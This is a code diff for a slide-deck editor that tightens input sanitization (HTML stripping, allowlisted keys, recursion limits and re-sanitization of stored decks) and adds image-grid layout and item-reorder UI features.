   if (clean.value) clean.value = sanitizeString(String(clean.value), 100);
   if (clean.title) clean.title = sanitizeString(clean.title, 500);
+  // Text-ish block fields that also reach the Markdown exporter — strip HTML at
+  // ingress so no field relies on the export encoder alone (defense-in-depth,
+  // complete mediation): a `<img>`/autolink in these must never survive import.
+  if (clean.loopLabel) clean.loopLabel = sanitizeString(clean.loopLabel, 200);
+  if (clean.alt) clean.alt = sanitizeString(clean.alt, 500);
+  if (clean.centerLabel) clean.centerLabel = sanitizeString(clean.centerLabel, 200);
+  if (clean.centerSub) clean.centerSub = sanitizeString(clean.centerSub, 200);
+  if (clean.annotation) clean.annotation = sanitizeString(clean.annotation, 500);
   if (clean.link) clean.link = sanitizeUrl(clean.link);
   // Image block <img src> auto-fetches on render. Vela decks load nothing
   // external, so restrict to inline data:image/* (no network, no data:text/html).
@@ -906,9 +1212,14 @@ function sanitizeBlock(block) {
       );
     }
     if (clean.type === "grid") {
+      // NOTE: pass the recursion depth explicitly — a bare `.map(sanitizeBlock)`
+      // would hand the array INDEX to the depth parameter.
       clean.items = clean.items.slice(0, 6).map((cell) => ({
         ...cell,
-        blocks: Array.isArray(cell?.blocks) ? cell.blocks.map(sanitizeBlock).filter(Boolean) : [],
+        // Cap nested breadth too: without this, a grid cell can carry an
+        // unbounded blocks array (and each may itself be a grid), bypassing the
+        // 30-blocks/slide breadth limit the slide-level arrays enforce.
+        blocks: Array.isArray(cell?.blocks) ? cell.blocks.slice(0, 30).map((b) => sanitizeBlock(b, depth + 1)).filter(Boolean) : [],
       }));
     }
     if (clean.type === "icon-row") {
@@ -918,6 +1229,7 @@ function sanitizeBlock(block) {
         const c = { ...it };
         if (c.text) c.text = sanitizeString(c.text, 500);
         if (c.label) c.label = sanitizeString(c.label, 200);
+        if (c.title) c.title = sanitizeString(c.title, 500);
         if (c.value) c.value = sanitizeString(String(c.value), 100);
         if (c.link) c.link = sanitizeUrl(c.link);
         return c;
@@ -929,6 +1241,7 @@ function sanitizeBlock(block) {
         const c = { ...it };
         if (c.label) c.label = sanitizeString(c.label, 200);
         if (c.title) c.title = sanitizeString(c.title, 500);
+        if (c.sublabel) c.sublabel = sanitizeString(c.sublabel, 200);
         if (c.text) c.text = sanitizeString(c.text, 1000);
         if (c.date) c.date = sanitizeString(c.date, 50);
         if (c.link) c.link = sanitizeUrl(c.link);
@@ -941,6 +1254,7 @@ function sanitizeBlock(block) {
         const c = { ...it };
         if (c.label) c.label = sanitizeString(c.label, 200);
         if (typeof c.value === "number") c.value = Math.max(0, Math.min(c.value, 100));
+        else if (c.value != null) c.value = sanitizeString(String(c.value), 20);
         return c;
       }).filter(Boolean);
     }
@@ -985,32 +1299,18 @@ function sanitizeBlock(block) {
     if (s && Object.keys(s).length) clean.style = s;
     else delete clean.style;
   }
-  if (Array.isArray(clean.items)) {
-    clean.items = clean.items.map(it => {
-      if (it && typeof it === "object" && "style" in it) {
-        const s = sanitizeStyle(it.style);
-        const c = { ...it };
-        if (s && Object.keys(s).length) c.style = s;
-        else delete c.style;
-        return c;
-      }
-      return it;
-    });
-  }
-  // Strip CSS auto-load values from color/background scalars on the block and on
-  // every item object (flow/icon-row/grid cell/etc. — cell.bg, cell.border,
-  // item.color, dotColor …). See scrubColorFields above. (v12.61)
+  // Strip CSS auto-load values from color/background scalars on the block
+  // itself (the allowlisted top-level object). See scrubColorFields above. (v12.61)
   scrubColorFields(clean);
   scrubLayoutFields(clean);
-  if (Array.isArray(clean.items)) {
-    for (const it of clean.items) { scrubColorFields(it); scrubLayoutFields(it); }
-  }
-  // The matrix block renders from a separate `quadrants` array (not `items`),
-  // so its per-quadrant color scalar must be scrubbed too. (Same CSS auto-load
-  // class as items; quadrants was previously never visited.)
-  if (Array.isArray(clean.quadrants)) {
-    for (const q of clean.quadrants) { scrubColorFields(q); scrubLayoutFields(q); }
-  }
+  // Harden deck SUB-OBJECTS recursively (list items, grid cells, matrix
+  // quadrants, comparison sides + their nested points): scrub color/layout/style
+  // values on every nested object and drop the `_`-prefixed private namespace.
+  // Unlike the top-level object these are raw-spread and keep arbitrary keys, so
+  // the scrubbers are their only backstop — apply them at every level, not just
+  // the first. See scrubSubObject above. (v13.24)
+  if (Array.isArray(clean.items)) scrubSubObject(clean.items);
+  if (Array.isArray(clean.quadrants)) scrubSubObject(clean.quadrants);
   return clean;
 }
 
@@ -1078,16 +1378,36 @@ function sanitizeStudyNotes(raw) {
 
 function sanitizeSlide(slide) {
   if (!slide || typeof slide !== "object") return null;
-  const clean = { ...slide };
+  // Allowlist copy (see SAFE_SLIDE_KEYS): unknown and `_`-prefixed keys are
+  // dropped here, so no deck-supplied field can impersonate a renderer-private
+  // flag or ride along into storage/export.
+  const clean = {};
+  for (const k of SAFE_SLIDE_KEYS) {
+    if (Object.prototype.hasOwnProperty.call(slide, k)) clean[k] = slide[k];
+  }
+  // Type + range at ingress for the numeric layout fields (see SLIDE_NUMERIC_BOUNDS).
+  for (const k in SLIDE_NUMERIC_BOUNDS) {
+    if (!(k in clean)) continue;
+    const [min, max, isInt] = SLIDE_NUMERIC_BOUNDS[k];
+    const n = clampDeckNumber(clean[k], min, max, isInt);
+    if (n === undefined) delete clean[k]; else clean[k] = n;
+  }
   // `hidden` (slide excluded from presentation/counts) — strict boolean only.
   if ("hidden" in clean) { if (clean.hidden === true) clean.hidden = true; else delete clean.hidden; }
-  if (Array.isArray(clean.blocks)) clean.blocks = clean.blocks.slice(0, 30).map(sanitizeBlock).filter(Boolean);
-  if (Array.isArray(clean.L)) clean.L = clean.L.slice(0, 30).map(sanitizeBlock).filter(Boolean);
-  if (Array.isArray(clean.R)) clean.R = clean.R.slice(0, 30).map(sanitizeBlock).filter(Boolean);
+  // NOTE: wrap the sanitizeBlock calls — a bare `.map(sanitizeBlock)` would pass
+  // the array INDEX into the recursion-depth parameter.
+  if (Array.isArray(clean.blocks)) clean.blocks = clean.blocks.slice(0, 30).map((b) => sanitizeBlock(b)).filter(Boolean);
+  if (Array.isArray(clean.L)) clean.L = clean.L.slice(0, 30).map((b) => sanitizeBlock(b)).filter(Boolean);
+  if (Array.isArray(clean.R)) clean.R = clean.R.slice(0, 30).map((b) => sanitizeBlock(b)).filter(Boolean);
   if (clean.title) clean.title = sanitizeString(clean.title, 500);
   if (clean.subtitle) clean.subtitle = sanitizeString(clean.subtitle, 500);
   if (clean.quote) clean.quote = sanitizeString(clean.quote, 2000);
   if (clean.author) clean.author = sanitizeString(clean.author, 200);
+  // Speaker/presenter notes are plain-text metadata that the Markdown exporter
+  // emits — HTML-strip them at ingress so no field depends on the export encoder
+  // alone (defense-in-depth, complete mediation).
+  if (clean.speakerNotes) clean.speakerNotes = sanitizeString(String(clean.speakerNotes), 5000);
+  if (clean.notes) clean.notes = sanitizeString(String(clean.notes), 5000);
   if (Array.isArray(clean.bullets)) clean.bullets = clean.bullets.slice(0, 30).map((b) => sanitizeString(String(b), 1000));
   if (Array.isArray(clean.comments)) clean.comments = clean.comments.slice(0, MAX_COMMENTS).map(sanitizeComment).filter(Boolean);
   if (clean.studyNotes) {
@@ -1096,7 +1416,11 @@ function sanitizeSlide(slide) {
   }
   // Slide background/color scalars (bg, bgGradient, color, accent, mutedColor)
   // feed inline CSS directly — scrub CSS auto-load values. See scrubColorFields. (v12.61)
+  // sanitizeBlock also runs scrubLayoutFields on the analogous block-level layout
+  // scalars (padding, gap, …) — apply the same pair here so the two ingress paths
+  // stay consistent instead of one silently omitting a scrubber. (v13.26)
   scrubColorFields(clean);
+  scrubLayoutFields(clean);
   // bgImage is a background *image* (auto-fetches on render). Restrict to inline
   // data:image/* — no network — matching the image block / branding-logo rule.
   if ("bgImage" in clean) {
@@ -1125,6 +1449,65 @@ function sanitizeItem(item) {
     createdAt: typeof item.createdAt === "string" ? item.createdAt.slice(0, 30) : now(),
     ...(item.presentCard ? { presentCard: true } : {}),
   };
+}
+
+// SECURITY (storage-load re-sanitization): the boot path reads the deck back
+// from persisted storage (localStorage / artifact storage) as raw
+// `JSON.parse(...)` and used to dispatch it straight into LOAD, which only
+// spreads the payload — it never re-runs sanitizeSlide. A slide that once
+// reached state unsanitized (e.g. a value written before a sanitizer fix
+// shipped, or via any future ingestion gap) would therefore reload — and keep
+// reloading — with its dangerous value intact: the value is JSON-native, so it
+// round-trips through storage perfectly. This is the persistence leg of the
+// same "trust the ingress sanitizer, nothing else" gap; every OTHER load path
+// (file import, startup-patch merge) already runs validateAndSanitizeDeck.
+//
+// Unlike validateAndSanitizeDeck (built for a fresh deck IMPORT — it discards
+// ids, chat history, selection, branding, etc. and is not safe to use for a
+// normal boot reload), this helper re-sanitizes ONLY the slide content inside
+// an already-loaded lanes tree: ids, comments, order, and every other item/lane
+// field are left exactly as read. It exists purely to re-run the same
+// sanitizeSlide() gate (allowlist copy + scrubCssFields fail-closed delete) that
+// every fresh-ingress path already gets, so a persisted deck can never be more
+// trusted than a freshly-supplied one. (v13.26)
+function resanitizeLoadedLanes(lanes) {
+  if (!Array.isArray(lanes)) return lanes;
+  return lanes.map((lane) => {
+    if (!lane || typeof lane !== "object") return lane;
+    const items = Array.isArray(lane.items) ? lane.items.map((item) => {
+      if (!item || typeof item !== "object") return item;
+      if (!Array.isArray(item.slides)) return item;
+      return { ...item, slides: item.slides.map(sanitizeSlide).filter(Boolean) };
+    }) : lane.items;
+    return { ...lane, items };
+  });
+}
+
+// SECURITY (storage-load re-sanitization, branding leg): resanitizeLoadedLanes
+// above re-scrubs slide/block content read back from storage but deliberately
+// leaves `branding` untouched (it isn't "slide content"). Branding's own color
+// scalars (accentColor, footerBg, footerColor, ...) feed the exact same raw-CSS
+// `background`/`color` sinks as slide/block fields, so a value that predates a
+// scrubber fix (or reached storage through any future ingestion gap) would
+// reload — and keep reloading — with its dangerous value intact, the same
+// persistence gap resanitizeLoadedLanes exists to close for slides. Reuse
+// scrubColorFields — the SAME function the SET_BRANDING reducer already runs on
+// every runtime branding edit — so a persisted branding object can never be
+// more trusted than a freshly-edited one. `logo` is additionally re-clamped to
+// an inline `data:image/*` URI (mirroring validateAndSanitizeDeck's import-time
+// clamp): it is an <img src> fetch sink that scrubColorFields' key patterns
+// don't cover, so it needs its own re-validation on the same reload path. Every
+// other branding field (names, ids, toggles, numeric sizing) is left exactly as
+// read — this only re-runs the two sanitizers that already gate fresh ingress. (v13.27)
+function resanitizeLoadedBranding(branding) {
+  if (!branding || typeof branding !== "object") return branding;
+  const b = { ...branding };
+  scrubColorFields(b);
+  if ("logo" in b) {
+    const clamped = sanitizeImageDataUri(typeof b.logo === "string" ? b.logo : "");
+    if (clamped) b.logo = clamped; else delete b.logo;
+  }
+  return b;
 }
 
 function validateAndSanitizeDeck(raw) {
@@ -1209,13 +1592,30 @@ const imageAspect = (dataUrl) => new Promise((resolve) => {
 // the image below ("stack"); otherwise the slide is promoted to "image-right" so
 // the image sits beside the existing body content. aspect = image width / height.
 const PASTE_TITLE_BLOCKS = new Set(["heading", "text", "subtitle", "badge", "quote"]);
-function pasteImageLayout(slide, aspect) {
+function pasteImageLayout(slide, aspect, n) {
   const layout = slide && slide.layout;
   if (layout && layout !== "stack") return layout; // respect explicit author layout
   const body = ((slide && slide.blocks) || []).filter((b) => b.type !== "image" && b.type !== "spacer" && b.type !== "divider");
   const mostlyTitle = body.length <= 2 && body.every((b) => PASTE_TITLE_BLOCKS.has(b.type));
+  const hasContent = body.length > 0 && !mostlyTitle;
+  // Heavy body text + a grid of images (>=3): don't cram the grid into a half.
+  // Keep the slide stacked so the text reads as a full-width header and the
+  // image run grids full-width below it (the renderer auto-grids the run).
+  if (hasContent && n >= 3) return "stack";
   const wide = aspect >= 1.6;
   return (!mostlyTitle && !wide) ? "image-right" : "stack";
+}
+
+// Columns for a run of `n` images, by region. "full" = image-only slide or a
+// full-width run below text; "half" = the image column beside body content.
+// Count-driven so the arrangement is a pure function of the run length (paste,
+// AI, or import all self-heal, and removal re-grids for free — no stored geometry).
+//   full:  1→1 solo · 2→1x2 · 3→1x3 · 4→2x2 · 5→3+2 (last row centered)
+//   half:  1→1 · >=2→2 (2-up, incomplete last row centered)
+function gridColsFor(n, region) {
+  n = Math.max(1, n | 0);
+  if (region === "half") return n <= 1 ? 1 : 2;
+  return ({ 1: 1, 2: 2, 3: 3, 4: 2, 5: 3 })[n] || 3;
 }
 
 // ━━━ Status & Importance Meta ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
@@ -1408,9 +1808,27 @@ const getCss = () => `
 @keyframes stg{from{opacity:0;transform:translateY(12px)}to{opacity:1;transform:translateY(0)}}
 @keyframes veraScan{0%{left:-60%}100%{left:160%}}
 @keyframes veraPulse{0%,100%{filter:brightness(1) saturate(1)}50%{filter:brightness(1.08) saturate(1.2)}}
+/* Type-register --vera-accent as a real <color>: an @property-registered custom
+   property is subject to CSS's own syntax check at the CSS layer, so even a value
+   that reached this point outside the normal cssColor()-encoded render path (the
+   set-property call itself, part-slides.jsx) falls back to initial-value instead
+   of being usable in var()/color-mix() below — a CSS-native backstop alongside the
+   JS-side encoder. inherits:true is required: the ::before/::after sweeps below
+   consume the value on descendant pseudo-elements, not the declaring node itself. */
+@property --vera-accent{syntax:"<color>";inherits:true;initial-value:#3b82f6}
+/* CR5: unified "Vera is working on this slide" scan. The sweep tint follows the
+   slide accent via --vera-accent (set on the wrapper), falling back to the
+   original Vera blue/violet when unset or where color-mix is unsupported. */
 .vera-thinking{position:relative;overflow:hidden;animation:veraPulse 2s ease-in-out infinite}
-.vera-thinking::before{content:'';position:absolute;top:0;left:-60%;width:40%;height:100%;background:linear-gradient(90deg,transparent,rgba(59,130,246,0.06),rgba(167,139,250,0.12),rgba(59,130,246,0.06),transparent);animation:veraScan 2s ease-in-out infinite;z-index:15;pointer-events:none}
+.vera-thinking::before{content:'';position:absolute;top:0;left:-60%;width:40%;height:100%;background:linear-gradient(90deg,transparent,rgba(59,130,246,0.06),rgba(167,139,250,0.12),rgba(59,130,246,0.06),transparent);background:linear-gradient(90deg,transparent,color-mix(in srgb,var(--vera-accent,#3b82f6) 8%,transparent),color-mix(in srgb,var(--vera-accent,#a78bfa) 16%,transparent),color-mix(in srgb,var(--vera-accent,#3b82f6) 8%,transparent),transparent);animation:veraScan 2s ease-in-out infinite;z-index:15;pointer-events:none}
 .vera-thinking::after{content:'';position:absolute;top:0;left:-60%;width:30%;height:100%;background:linear-gradient(90deg,transparent,rgba(255,255,255,0.04),transparent);animation:veraScan 2s ease-in-out .6s infinite;z-index:15;pointer-events:none}
+/* CR5: reduced-motion — drop the sweep/breathing but keep a calm static accent
+   glow so the "AI is on this slide" signal survives; completion swaps instantly. */
+@media (prefers-reduced-motion: reduce){
+  .vera-thinking{animation:none;box-shadow:inset 0 0 0 2px rgba(59,130,246,0.4);box-shadow:inset 0 0 0 2px color-mix(in srgb,var(--vera-accent,#3b82f6) 40%,transparent)}
+  .vera-thinking::before,.vera-thinking::after{animation:none;opacity:.4}
+  .magic-reveal,.magic-reveal::after{animation:none}
+}
 [class^="stg-"]{max-width:100%;box-sizing:border-box}
 .stg-1{animation:stg .4s ease-out .05s both}.stg-2{animation:stg .4s ease-out .12s both}.stg-3{animation:stg .4s ease-out .19s both}
 .stg-4{animation:stg .4s ease-out .26s both}.stg-5{animation:stg .4s ease-out .33s both}.stg-6{animation:stg .4s ease-out .4s both}.stg-7{animation:stg .4s ease-out .47s both}
@@ -1461,7 +1879,8 @@ function useSwipe(ref, { onLeft, onRight, threshold = 50 } = {}) {
 }
 
 // ━━━ Shared Prompt Constants (deduped from 3 system prompts) ━━━━━━━
-const BLOCK_REFERENCE = `Slide: { blocks: [...], bg?, bgGradient?: "linear-gradient(...)", color?, accent?, align?, verticalAlign?, padding?, gap?, duration?: seconds_integer, layout?: "stack"|"image-right"|"image-left"|"cols", contentFlex?, imageFlex?, splitGap?, L?: [...], R?: [...] }
+const BLOCK_REFERENCE = `Slide: { blocks: [...], bg?, bgGradient?: "linear-gradient(...)", color?, accent?, align?, verticalAlign?, padding?, gap?, duration?: seconds_integer, layout?: "stack"|"image-right"|"image-left"|"cols", contentFlex?, imageFlex?, splitGap?, imageCols?: 1-6, L?: [...], R?: [...] }
+Numeric slide fields are range-checked on load: imageCols is an integer 1-6, gap/splitGap 0-200, contentFlex/imageFlex 0.1-20. imageCols pins the column count for a run of adjacent image blocks (omit for automatic).
 Layout: "stack" (default) = vertical column. "image-right"/"image-left" = splits content blocks and image blocks side-by-side. "cols" = explicit two-column layout using L (left blocks) and R (right blocks) arrays. blocks renders full-width above columns (optional header). contentFlex/imageFlex control column ratio (default 1:1). splitGap controls gap between columns (default 32).
 Inline formatting: All text supports **bold**, *italic*, ***bold+italic*** using markdown syntax (also __bold__ and _italic_). Use in headings, text, bullets, callouts, etc.
 Links: ANY block can have an optional "link" property: {type:"text", text:"Read the paper", link:"https://..."} — renders clickable. For sources/citations, ALWAYS use a descriptive text block or badge with link property instead of putting raw URLs in text. E.g. {type:"badge", text:"📎 Yao et al., ReAct (2022)", icon:"ExternalLink", link:"https://arxiv.org/abs/2210.03629"} or {type:"text", text:"Source: Snorkel AI Blog", size:"sm", link:"https://snorkel.ai/blog/..."}
@@ -2141,6 +2560,47 @@ function addItemAt(block, onChange, newItem) {
   onChange?.({ items: [...(block.items || []), newItem] });
 }
 
+// Swap block.items[idx] with its neighbour ("up" = earlier, "down" = later) and
+// call onChange. No-op at the list boundary. Mirrors the reducer's REORDER swap.
+function moveItemAt(block, onChange, idx, dir) {
+  const items = [...(block.items || [])];
+  const t = dir === "up" ? idx - 1 : idx + 1;
+  if (t < 0 || t >= items.length) return;
+  [items[idx], items[t]] = [items[t], items[idx]];
+  onChange?.({ items });
+}
+
+// Build the pin-aware control ItemChrome renders as ▲▼ arrows:
+//   { onUp, onDown, pinned, anyPinned, clearPin }
+// `move(dir)` performs the swap; `keyOf(i)` maps a slot index to its pin key;
+// `pin` = { key, set } is shared per-block state (from RenderBlock).
+//
+// After a move we pin the DESTINATION slot (keyOf(idx±1)) so its cluster stays
+// visible on the item that just landed there — instead of the neighbour that
+// slid under the cursor stealing focus. The pin is positional (survives the swap
+// without item ids) and is cleared on the next mouse move (see ItemChrome).
+// `anyPinned` lets every other item suppress its own hover cluster while pinned.
+const _noPin = { key: null, set: () => {} };
+const reorderCtl = (n, idx, move, keyOf, pin) => {
+  const p = pin || _noPin;
+  return {
+    onUp: idx > 0 ? () => { move("up"); p.set(keyOf(idx - 1)); } : undefined,
+    onDown: idx < n - 1 ? () => { move("down"); p.set(keyOf(idx + 1)); } : undefined,
+    pinned: p.key === keyOf(idx),
+    anyPinned: p.key != null,
+    clearPin: () => p.set(null),
+  };
+};
+
+// Reorder control for a plain block.items list — undefined when not editable or
+// when there is nothing to reorder (0–1 items).
+function itemReorder(block, onChange, idx, pin) {
+  if (!onChange) return undefined;
+  const n = (block.items || []).length;
+  if (n <= 1) return undefined;
+  return reorderCtl(n, idx, (d) => moveItemAt(block, onChange, idx, d), String, pin);
+}
+
 // Placeholder item factory for the "+ add" affordance on multi-item blocks.
 // Returns a blank item with neutral placeholder text/icon matching each block
 // type's item shape — so a fresh item is editable inline without resorting to AI.
@@ -2271,7 +2731,9 @@ function IconBubble({ icon, size = 20, color, bg, shape, strokeWidth = 1.5 }) {
   const el = getIcon(icon, { size, color, strokeWidth });
   if (!el) return null;
   const d = size * 1.8;
-  return <div style={{ width: d, height: d, borderRadius: shape === "square" ? 8 : "50%", background: bg, display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>{el}</div>;
+  // `bg` mixes deck-supplied values (block.bg/iconBg/item.iconBg) with computed
+  // theme+alpha fallbacks — encoder-gate once here for every caller. (v13.26)
+  return <div style={{ width: d, height: d, borderRadius: shape === "square" ? 8 : "50%", background: cssColor(bg), display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>{el}</div>;
 }
 
 // ━━━ Per-Item Chrome — hover toolbar (🔗 link + ✕ delete) for one item of a multi-item block ━━
@@ -2285,10 +2747,13 @@ function IconBubble({ icon, size = 20, color, bg, shape, strokeWidth = 1.5 }) {
 // the item toolbar and the block toolbar are never shown stacked on the same corner.
 const ItemHoverContext = React.createContext(null);
 const itemChromeBtn = (bg, border, color) => ({ width: 18, height: 18, borderRadius: "50%", background: bg, border: `1px solid ${border}`, color, fontSize: 9, cursor: "pointer", display: "flex", alignItems: "center", justifyContent: "center", lineHeight: 1, padding: 0, boxShadow: "0 2px 6px rgba(0,0,0,0.4)" });
+// Reorder arrow — a full-size round button (same footprint as the link/delete
+// chrome) so it's an easy click target. Dimmed + non-interactive at a boundary.
+const reorderArrowBtn = (enabled) => ({ ...itemChromeBtn(T.bgPanel, T.border, enabled ? T.text : T.border), fontSize: 10, fontWeight: 700, cursor: enabled ? "pointer" : "default", opacity: enabled ? 1 : 0.4 });
 
 // noLinkBadge: keep link click-through + PDF export but render no link UI (badge/popup/button)
 // — used by grid, where the inner block already owns the link-editing chrome.
-function ItemChrome({ editable, presenting, onDelete, link, onSetLink, children, className, wrapStyle, linkLabel, anchor, badgeAnchor, noLinkBadge }) {
+function ItemChrome({ editable, presenting, onDelete, link, onSetLink, children, className, wrapStyle, linkLabel, anchor, badgeAnchor, noLinkBadge, reorder }) {
   const [hovered, setHovered] = useState(false);
   const [editingLink, setEditingLink] = useState(false);
   const notifyHover = React.useContext(ItemHoverContext);
@@ -2301,19 +2766,27 @@ function ItemChrome({ editable, presenting, onDelete, link, onSetLink, children,
   const ba = badgeAnchor || { top: 2, right: 2 };
   const enter = () => { setHovered(true); if (editMode) notifyHover?.(true); };
   const leave = () => { setHovered(false); if (editMode) notifyHover?.(false); };
+  // While a reorder pin is active anywhere in the block, the pinned slot keeps its
+  // cluster and every other item suppresses hover — so the item that just moved
+  // stays focused instead of the neighbour now under the cursor. The pin clears on
+  // the next mouse move, handing control back to plain hover.
+  const clusterVisible = reorder && reorder.anyPinned ? reorder.pinned : hovered;
   return (
     <div className={className} style={{ position: "relative", ...(clickable ? { cursor: "pointer" } : {}), ...wrapStyle }}
       title={link ? linkPreview(link, linkLabel) : undefined}
+      onMouseMove={reorder && reorder.anyPinned ? () => reorder.clearPin?.() : undefined}
       data-pdf-link={link || undefined}
       onClick={clickable ? (e) => { e.stopPropagation(); openExternalLink(link); } : undefined}
       onMouseEnter={enter} onMouseLeave={leave}>
       {children}
-      {/* Idle link badge — edit mode, not hovered */}
-      {link && showLinkUI && !hovered && editMode && <div onClick={(e) => { e.stopPropagation(); setEditingLink(true); }} style={{ position: "absolute", ...ba, width: 14, height: 14, borderRadius: "50%", background: T.accent + "80", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 7, zIndex: 5, cursor: "pointer" }} title={link}>🔗</div>}
+      {/* Idle link badge — edit mode, cluster not shown */}
+      {link && showLinkUI && !clusterVisible && editMode && <div onClick={(e) => { e.stopPropagation(); setEditingLink(true); }} style={{ position: "absolute", ...ba, width: 14, height: 14, borderRadius: "50%", background: T.accent + "80", display: "flex", alignItems: "center", justifyContent: "center", fontSize: 7, zIndex: 5, cursor: "pointer" }} title={link}>🔗</div>}
       {/* Idle link badge — presenter */}
       {link && presenting && !noLinkBadge && <div onClick={(e) => { e.stopPropagation(); openExternalLink(link); }} style={{ position: "absolute", ...ba, padding: "2px 5px", borderRadius: 4, background: T.accent, fontSize: 9, color: "#fff", zIndex: 12, cursor: "pointer", opacity: hovered ? 1 : 0.3, transition: "opacity 0.2s", boxShadow: "0 2px 6px rgba(0,0,0,0.4)" }}>🔗</div>}
-      {/* Hover cluster — edit mode */}
-      {hovered && editMode && (showLinkUI || deletable) && <div style={{ position: "absolute", ...a, display: "flex", gap: 3, zIndex: 11 }}>
+      {/* Hover cluster — edit mode (or pinned after a reorder move) */}
+      {clusterVisible && editMode && (showLinkUI || deletable || reorder) && <div style={{ position: "absolute", ...a, display: "flex", alignItems: "center", gap: 3, zIndex: 11 }}>
+        {reorder && <button onClick={(e) => { e.stopPropagation(); reorder.onUp?.(); }} disabled={!reorder.onUp} style={reorderArrowBtn(!!reorder.onUp)} title="Move up">▲</button>}
+        {reorder && <button onClick={(e) => { e.stopPropagation(); reorder.onDown?.(); }} disabled={!reorder.onDown} style={reorderArrowBtn(!!reorder.onDown)} title="Move down">▼</button>}
         {showLinkUI && <button onClick={(e) => { e.stopPropagation(); setEditingLink(!editingLink); }} style={itemChromeBtn(link ? T.accent : T.bgPanel, link ? T.accent : T.border, link ? "#fff" : T.textDim)} title={link ? `Link: ${link}` : "Add link"}>🔗</button>}
         {deletable && <button onClick={(e) => { e.stopPropagation(); onDelete(); }} style={{ ...itemChromeBtn(T.red, T.red, "#fff"), fontWeight: 700 }} title="Delete item">✕</button>}
       </div>}
@@ -2328,7 +2801,7 @@ function ItemChrome({ editable, presenting, onDelete, link, onSetLink, children,
 }
 
 // ━━━ Icon Row Item (per-item link + delete) ━━━━━━━━━━━━━━━━━━━━━━━━━
-function IconRowItem({ item, index, block, editable, onChange, st, SIZES, staggerIdx, presenting = false }) {
+function IconRowItem({ item, index, block, editable, onChange, st, SIZES, staggerIdx, presenting = false, pin }) {
   const link = item.link;
   const editMode = editable && !presenting;
   return (
@@ -2336,6 +2809,7 @@ function IconRowItem({ item, index, block, editable, onChange, st, SIZES, stagge
       className={stg(staggerIdx, index)}
       wrapStyle={{ display: "flex", width: link ? "fit-content" : undefined, gap: 14, alignItems: "center" }}
       link={link} linkLabel={item.title}
+      reorder={itemReorder(block, onChange, index, pin)}
       onSetLink={onChange ? (url) => setItemLink(block, onChange, index, url) : undefined}
       onDelete={onChange ? () => removeItemAt(block, onChange, index) : undefined}>
       <EditableIcon editable={editMode} value={item.icon} size={20} onPick={onChange ? (name) => patchItemAt(block, onChange, index, { icon: name }) : undefined}>
@@ -2350,7 +2824,7 @@ function IconRowItem({ item, index, block, editable, onChange, st, SIZES, stagge
 }
 
 // ━━━ Bullet Item (per-item link + delete) ━━━━━━━━━━━━━━━━━━━━━
-function BulletItem({ item, index, block, editable, onChange, st, SIZES, staggerIdx, fontScale, presenting = false }) {
+function BulletItem({ item, index, block, editable, onChange, st, SIZES, staggerIdx, fontScale, presenting = false, pin }) {
   const text = typeof item === "string" ? item : item.text;
   const icon = typeof item === "object" ? item.icon : null;
   const link = itemLinkOf(item);
@@ -2367,13 +2841,14 @@ function BulletItem({ item, index, block, editable, onChange, st, SIZES, stagger
       className={stg(staggerIdx, index)}
       wrapStyle={{ display: "flex", gap: 12, alignItems: "center" }}
       link={link} linkLabel={text}
+      reorder={itemReorder(block, onChange, index, pin)}
       onSetLink={onChange ? (url) => setItemLink(block, onChange, index, url) : undefined}
       onDelete={onChange ? () => removeItemAt(block, onChange, index) : undefined}>
       {icon
-        ? <EditableIcon editable={editMode} value={icon} size={16} onPick={pickIcon}><span style={{ flexShrink: 0, display: "flex" }}>{getIcon(icon, { size: 16, color: block.dotColor || st.accent, strokeWidth: 2 })}</span></EditableIcon>
+        ? <EditableIcon editable={editMode} value={icon} size={16} onPick={pickIcon}><span style={{ flexShrink: 0, display: "flex" }}>{getIcon(icon, { size: 16, color: cssColor(block.dotColor) || st.accent, strokeWidth: 2 })}</span></EditableIcon>
         : (editMode
           ? <EditableIcon editable value={undefined} size={14} onPick={pickIcon} />
-          : <div style={{ width: 6, height: 6, borderRadius: "50%", background: block.dotColor || st.accent, flexShrink: 0 }} />)}
+          : <div style={{ width: 6, height: 6, borderRadius: "50%", background: cssColor(block.dotColor) || st.accent, flexShrink: 0 }} />)}
       <EditableText text={text} editable={editMode} onSave={(v) => {
         const ni = [...(block.items || [])];
         ni[index] = typeof item === "string" ? v : { ...item, text: v };
@@ -2419,7 +2894,7 @@ function GridCellBlock({ block, staggerIdx, slideTheme, editable, onChange, slid
 }
 
 // ━━━ Zoomable Block Wrapper ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-function ZoomWrap({ children, enabled, link }) {
+function ZoomWrap({ children, enabled, link, fill }) {
   const [zoomed, setZoomed] = useState(false);
   const [hovered, setHovered] = useState(false);
   const sourceRef = useRef(null);
@@ -2461,7 +2936,7 @@ function ZoomWrap({ children, enabled, link }) {
   const triggerZoom = (e) => { e.stopPropagation(); setZoomed(true); };
 
   return <>
-    <div ref={sourceRef} style={{ position: "relative", cursor: hasLink ? "pointer" : "zoom-in" }}
+    <div ref={sourceRef} style={{ position: "relative", cursor: hasLink ? "pointer" : "zoom-in", ...(fill ? { flex: 1, height: "100%", minHeight: 0 } : {}) }}
       onClick={hasLink ? undefined : triggerZoom}
       onMouseEnter={() => setHovered(true)} onMouseLeave={() => setHovered(false)}>
       {children}
@@ -2494,7 +2969,7 @@ function CodeBlock({ block, cls, st, editable, onChange, SIZES }) {
       });
     }
   };
-  return <div className={cls} style={{ position: "relative", background: block.bg || "rgba(0,0,0,0.2)", borderRadius: 8, padding: "16px 20px", border: `1px solid ${st.border}`, overflow: "auto", ...block.style }}>
+  return <div className={cls} style={{ position: "relative", background: cssColor(block.bg) || "rgba(0,0,0,0.2)", borderRadius: 8, padding: "16px 20px", border: `1px solid ${st.border}`, overflow: "auto", ...block.style }}>
     {block.label && <EditableText text={block.label} editable={editable} onSave={(v) => onChange?.({ label: v })} style={{ fontFamily: FONT.mono, fontSize: SIZES.xs, color: st.accent, marginBottom: 8, letterSpacing: "0.05em", textTransform: "uppercase" }} />}
     <EditableText text={block.text} editable={editable} onSave={(v) => onChange?.({ text: v })} multiline style={{ fontFamily: FONT.mono, fontSize: SIZES[block.size || "sm"], color: block.color || st.text, lineHeight: 1.6, margin: 0, whiteSpace: "pre-wrap", ...(showCopy ? { paddingRight: 80 } : {}) }} />
